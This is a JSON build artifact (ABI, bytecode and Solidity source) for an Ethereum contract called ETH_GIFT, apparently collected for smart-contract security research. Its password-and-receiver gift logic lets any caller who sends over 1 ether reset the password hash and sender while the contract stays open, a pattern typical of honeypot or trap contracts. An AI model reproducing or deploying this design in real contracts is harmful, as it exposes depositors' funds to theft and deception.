{
  "contractName": "ETH_GIFT",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "Set_eth_gift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "date",
          "type": "uint256"
        }
      ],
      "name": "SetGiftTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_reciver",
          "type": "address"
        }
      ],
      "name": "SetReciver",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b5061063b8061003b6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063181ffc5f146100855780632923f101146100b357806331fd725a146100d7578063410c800514610108578063b456ecc51461014b578063bea948c8146101d0578063dac47a71146101da575b005b6100b1600480360381019080803590602001908201803590602001919091929391929390505050610207565b005b6100d560048036038101908080356000191690602001909291905050506102ad565b005b3480156100e357600080fd5b506101066004803603810190808035600019169060200190929190505050610340565b005b34801561011457600080fd5b50610149600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506103c8565b005b34801561015757600080fd5b506101b2600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610462565b60405180826000191660001916815260200191505060405180910390f35b6101d86104ce565b005b3480156101e657600080fd5b506102056004803603810190808035906020019092919050505061059a565b005b6003544211156102a35781816040518083838082843782019150509250505060405180910390206000191660005460001916141561029e573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561029c573d6000803e3d6000fd5b505b6102a8565b6102a9565b5b5050565b600160009054906101000a900460ff161580156102d15750670de0b6b3a764000034115b806102e55750600060010260005460001916145b1561033d578060008160001916905550336001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426003819055505b50565b6000546000191681600019161480156103a557506001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b156103c55760018060006101000a81548160ff0219169083151502179055505b50565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561045f5780600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6000816040518082805190602001908083835b60208310151561049a5780518252602082019150602081019050602083039250610475565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b60035442111561059257600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561058d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561058b573d6000803e3d6000fd5b505b610597565b610598565b5b565b600354421115610606576001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561060157806003819055505b61060b565b61060c565b5b505600a165627a7a7230582075e173740fbf1f50ab390910a6462c845e2f95bba89639b0023f5a260d31a2200029",
  "source": "\n\ncontract ETH_GIFT\n{\n    function GetGift(bytes pass) external payable canOpen {\n        if(hashPass == keccak256(pass))\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function GetGift() public payable canOpen {\n        if(msg.sender==reciver)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    bytes32 hashPass;\n    bool closed = false;\n    address sender;\n    address reciver;\n    uint giftTime;\n \n    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n    \n    function Set_eth_gift(bytes32 hash) public payable {\n        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)\n        {\n            hashPass = hash;\n            sender = msg.sender;\n            giftTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint date) public canOpen {\n        if(msg.sender==sender)\n        {\n            giftTime = date;\n        }\n    }\n    \n    function SetReciver(address _reciver) public {\n        if(msg.sender==sender)\n        {\n            reciver = _reciver;\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash) public {\n        if(hash==hashPass&&msg.sender==sender)\n        {\n           closed=true;\n        }\n    }\n    \n    modifier canOpen(){\n        if(now>giftTime)_;\n        else return;\n    }\n    \n    function() public payable{}\n    \n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xc6389ef3d79cf17a5d103bd0f06f83cf76b14258/contracts/0xc6389ef3d79cf17a5d103bd0f06f83cf76b14258.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:06:17.561Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}